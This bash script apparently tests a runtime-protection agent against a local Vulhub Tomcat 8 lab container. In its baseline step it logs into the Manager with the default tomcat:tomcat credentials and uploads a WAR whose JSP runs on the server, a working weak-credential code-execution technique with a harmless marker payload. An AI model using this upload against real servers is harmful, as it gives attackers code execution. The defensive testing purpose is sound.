#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar

image="${OHMYRASP_VULHUB_TOMCAT8_MANAGER_IMAGE:-vulhub/tomcat:8.0}"
vulhub_dir="${OHMYRASP_VULHUB_TOMCAT8_MANAGER_DIR:-/home/ubuntu/vulhub/tomcat/tomcat8}"
baseline_name="${OHMYRASP_VULHUB_TOMCAT8_MANAGER_BASELINE_NAME:-ohmyrasp-vulhub-tomcat8-manager-baseline}"
protected_name="${OHMYRASP_VULHUB_TOMCAT8_MANAGER_PROTECTED_NAME:-ohmyrasp-vulhub-tomcat8-manager-protected}"
baseline_port="${OHMYRASP_VULHUB_TOMCAT8_MANAGER_BASELINE_PORT:-19492}"
protected_port="${OHMYRASP_VULHUB_TOMCAT8_MANAGER_PROTECTED_PORT:-19493}"
app_path="${OHMYRASP_VULHUB_TOMCAT8_MANAGER_APP_PATH:-/ohmyrasp-manager}"
marker="${OHMYRASP_VULHUB_TOMCAT8_MANAGER_MARKER:-ohmyrasp-tomcat8-manager:}"
baseline_dir="logs/vulhub-tomcat-8.0-manager-java7-baseline"
protected_dir="logs/vulhub-tomcat-8.0-manager-java7-protected"
payload_dir="logs/vulhub-tomcat-8.0-manager-java7-payload"
payload_war="${payload_dir}/payload.war"

copy_logs() {
  local name="$1"
  local dir="$2"
  if docker inspect "$name" >/dev/null 2>&1; then
    docker logs "$name" > "${dir}/container.log" 2>&1 || true
  fi
}

cleanup() {
  copy_logs "$baseline_name" "$baseline_dir"
  copy_logs "$protected_name" "$protected_dir"
  docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

require_vulhub_files() {
  for file in "${vulhub_dir}/tomcat-users.xml" "${vulhub_dir}/context.xml"; do
    if [[ ! -f "$file" ]]; then
      echo "missing Vulhub Tomcat8 file: ${file}" >&2
      exit 1
    fi
  done
}

verify_image_java7() {
  docker run --rm --entrypoint java "$image" -version > "${payload_dir}/image-java-version.txt" 2>&1
  if ! grep -Fq '1.7.0_121' "${payload_dir}/image-java-version.txt"; then
    cat "${payload_dir}/image-java-version.txt" >&2
    echo "Tomcat8 Manager image did not report the expected Java 7u121 runtime" >&2
    exit 1
  fi
}

write_payload() {
  rm -rf "${payload_dir}/war"
  mkdir -p "${payload_dir}/war"
  printf '<%% out.print("%s" + System.getProperty("java.version")); %%>\n' "$marker" \
    > "${payload_dir}/war/index.jsp"
  docker run --rm \
    -v "$(pwd)/${payload_dir}:/payload" \
    -w /payload \
    gradle:jdk25 \
    jar cf payload.war -C war .
}

start_tomcat() {
  local name="$1"
  local port="$2"
  shift 2
  docker run -d --name "$name" \
    -p "${port}:8080" \
    -v "${vulhub_dir}/tomcat-users.xml:/usr/local/tomcat/conf/tomcat-users.xml:ro" \
    -v "${vulhub_dir}/context.xml:/usr/local/tomcat/webapps/manager/META-INF/context.xml:ro" \
    -v "${vulhub_dir}/context.xml:/usr/local/tomcat/webapps/host-manager/META-INF/context.xml:ro" \
    "$@" \
    "$image" >/dev/null
}

wait_for_manager() {
  local name="$1"
  local port="$2"
  local dir="$3"
  local status
  for attempt in $(seq 1 120); do
    status="$(
      curl -sS --max-time 8 \
        -u tomcat:tomcat \
        -o "${dir}/manager-${attempt}.html" \
        -w '%{http_code}' \
        "http://127.0.0.1:${port}/manager/html" 2>"${dir}/manager-${attempt}.err" || true
    )"
    printf 'manager_attempt=%s status=%s\n' "$attempt" "$status" >> "${dir}/attempts.log"
    if [[ "$status" == "200" ]]; then
      return
    fi
    if ! docker ps --filter "name=${name}" --filter status=running --format '{{.Names}}' \
      | grep -Fq "$name"; then
      docker logs "$name" >&2 || true
      echo "Tomcat8 Manager container ${name} stopped before readiness" >&2
      exit 1
    fi
    sleep 1
  done
  docker logs "$name" >&2 || true
  echo "Tomcat8 Manager did not become ready on ${port}" >&2
  exit 1
}

deploy_war() {
  local port="$1"
  local dir="$2"
  curl -sS --max-time 30 \
    -u tomcat:tomcat \
    --upload-file "$payload_war" \
    -o "${dir}/deploy.response" \
    -w '%{http_code}' \
    "http://127.0.0.1:${port}/manager/text/deploy?path=${app_path}&update=true" || true
}

get_marker() {
  local port="$1"
  local dir="$2"
  curl -sS --max-time 20 \
    -o "${dir}/jsp.response" \
    -w '%{http_code}' \
    "http://127.0.0.1:${port}${app_path}/index.jsp" || true
}

run_baseline() {
  start_tomcat "$baseline_name" "$baseline_port"
  wait_for_manager "$baseline_name" "$baseline_port" "$baseline_dir"

  local deploy_status
  local jsp_status
  deploy_status="$(deploy_war "$baseline_port" "$baseline_dir")"
  printf 'deploy_status=%s\n' "$deploy_status" >> "${baseline_dir}/attempts.log"
  if [[ "$deploy_status" != "200" ]] || ! grep -Fq 'OK - Deployed application' "${baseline_dir}/deploy.response"; then
    cat "${baseline_dir}/deploy.response" >&2 || true
    echo "baseline Tomcat8 Manager did not deploy the WAR through weak credentials" >&2
    exit 1
  fi

  jsp_status="$(get_marker "$baseline_port" "$baseline_dir")"
  printf 'jsp_status=%s\n' "$jsp_status" >> "${baseline_dir}/attempts.log"
  if [[ "$jsp_status" != "200" ]] || ! grep -Fq "${marker}1.7.0_121" "${baseline_dir}/jsp.response"; then
    cat "${baseline_dir}/jsp.response" >&2 || true
    echo "baseline Tomcat8 Manager JSP marker did not execute" >&2
    exit 1
  fi
  copy_logs "$baseline_name" "$baseline_dir"
  docker rm -f "$baseline_name" >/dev/null 2>&1 || true
}

run_protected_boundary() {
  start_tomcat "$protected_name" "$protected_port" \
    -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
    -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
    -e "CATALINA_OPTS=-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true"

  sleep 4
  copy_logs "$protected_name" "$protected_dir"
  if ! grep -Fq 'Unsupported major.minor version 52.0' "${protected_dir}/container.log"; then
    sed -n '1,160p' "${protected_dir}/container.log" >&2 || true
    echo "Tomcat8 Manager Java 7 protected probe did not show Java 8 agent class-version mismatch" >&2
    exit 1
  fi
  if docker ps --filter "name=${protected_name}" --filter status=running --format '{{.Names}}' \
    | grep -Fq "$protected_name"; then
    echo "Tomcat8 Manager Java 7 container unexpectedly kept running with Java 8 agent" >&2
    exit 1
  fi
}

require_vulhub_files
rm -rf "$baseline_dir" "$protected_dir" "$payload_dir"
mkdir -p "$baseline_dir" "$protected_dir" "$payload_dir"
chmod 777 "$protected_dir"
docker rm -f "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

verify_image_java7
write_payload
run_baseline
run_protected_boundary

echo "vulhub Tomcat8 Manager weak-credential Java7 legacy boundary passed"
